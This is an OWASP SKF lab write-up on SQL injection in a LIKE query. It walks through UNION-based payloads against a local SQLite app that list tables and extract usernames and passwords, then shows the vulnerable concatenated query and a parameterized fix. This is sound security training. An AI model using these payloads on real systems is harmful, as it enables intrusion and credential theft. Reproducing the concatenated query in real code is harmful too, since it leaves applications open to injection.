# KBID 156 - SQLI \(Like\)

## Running the app

```text
$ sudo docker pull blabla1337/owasp-skf-lab:sqli-like
```

```text
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:sqli-like
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Running the app Python3

First, make sure python3 and pip are installed on your host machine.
After installation, we go to the folder of the lab we want to practise
"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:

```
$ pip3 install -r requirements.txt
```

```
$ python3 <labname>
```

{% hint style="success" %}
 Now that the app is running let's go hacking!
{% endhint %}


![Docker image and write-up thanks to Contrahack.io !](.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)

## Reconnaissance

### Step1

The first step is to identify parameters which could be potentially used in an SQL query to communicate with the underlying database. In this example we find that the "/home" method grabs data by page name and displays the content.

![](.gitbook/assets/sqli-like-1.png)

```text
http://localhost:5000/home/Admin
```

### Step2

Now let's see if we can create an error by injecting a single quote

![](.gitbook/assets/sqli-like-2.png)

```text
http://localhost:5000/home/Admin'
```

By doing so the SQL query syntax is now faulty. This is due to the fact that the user supplied input is being directly concatenated into the SQL query.

```python
db.execute("SELECT UserName, email FROM users WHERE UserName LIKE '%"+username+"%' ORDER BY UserId")
```

### Step3

Now we need to inject characters to make the SQL query syntactically correct.

![](.gitbook/assets/sqli-like-3.png)

```text
http://localhost:5000/home/Admin%'--
```

After that we inject a logical operator which is true \(and 1=1\). This should result in the application run as intended without errors.

![](.gitbook/assets/sqli-like-4.png)

```text
http://127.0.0.1:5000/home/Admin%' AND 1=1--
```

## Exploitation

Now that we know that the application is vulnerable for SQL injections we are going to use this vulnerability to read sensitive information from the database. This process could be automated with tools such as SQLMAP. However, for this example let's try to exploit the SQL injection manually.

### Step1

The UNION operator is used in SQL injections to join a query, purposely forged to the original query. This allows to obtain the values of columns of other tables. First we need to determine the number of columns used by the original query. We can do this by trial and error.

![](.gitbook/assets/sqli-like-5.png)

```text
http://localhost:5000/home/Admin%' union select 1--
```

This query results in an error, this is due to the fact that the original query started with 2 columns namely  
\* UserName \* email

![](.gitbook/assets/sqli-like-6.png)

```text
http://localhost:5000/home/Admin%' union select 1,2--
```

Notice how "UserName" and "email" became placeholders for data we want to retrieve from the database

### Step 2

Now that we determined the number of columns we need to take, the next step is querying system tables to check which tables are stored in the Database. From the error message in the first picture, we can determine a SQLite DB is being used. As the application didn't return an error, our guess is correct.

![](.gitbook/assets/sqli-like-7.png)

```text
http://localhost:5000/home/Admin%' union select 1,2 from sqlite_master--
```

#### Step 3

Now we need to discover the table and columns name of the table we want to extract. As the application only displays the first result, we need to play with SQL Limit.

![](.gitbook/assets/sqli-like-8.png)

```text
http://localhost:5000/home/Admin%' union select tbl_name,sql from sqlite_master limit 1,1--
```

#### Step 4

Now we have all the information required to extract data from _users_ table. Play with SQL Limit to get credentials from more users.

![](.gitbook/assets/sqli-like-9.png)

```text
http://localhost:5000/home/Admin%' union select UserName,Password from users limit 0,1--
```

## Mitigation

## Mitigation
SQL Injection can be prevented by following the methods described below:

Primary Defenses:

First step: White-list Input Validation

Second step: Use of Prepared Statements (Parameterized Queries)

Additional Defenses:

Also: Enforcing Least Privilege
Also: Performing Allow-list Input Validation as a Secondary Defense

In this case, we have presented a SQLi code fix by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.

The following code is vulnerable to SQL injection as the user input is directly concatenated into query without any form of validation:
PATH:/SQLI-like/SQLI-like.py

```
cur = db.execute("SELECT UserName, email FROM users WHERE UserName LIKE '%"+username+"%' ORDER BY UserId")
```

This code can be easily rewritten in a way that prevent the user input from interfering with the query structure:

```
cur = db.execute("SELECT UserName, email FROM users WHERE UserName LIKE ? ORDER BY UserId",('%'+username+'%',))
```

Can you try to implement input validation or escaping?


## Additional sources

Please refer to the OWASP testing guide for a full complete description about SQL injection with all the edge cases over different platforms!

[https://www.owasp.org/index.php/Testing\_for\_SQL\_Injection\_\(OTG-INPVAL-005\)](https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29)

SQLite Reference

[https://www.techonthenet.com/sqlite/sys\_tables/index.php](https://www.techonthenet.com/sqlite/sys_tables/index.php)
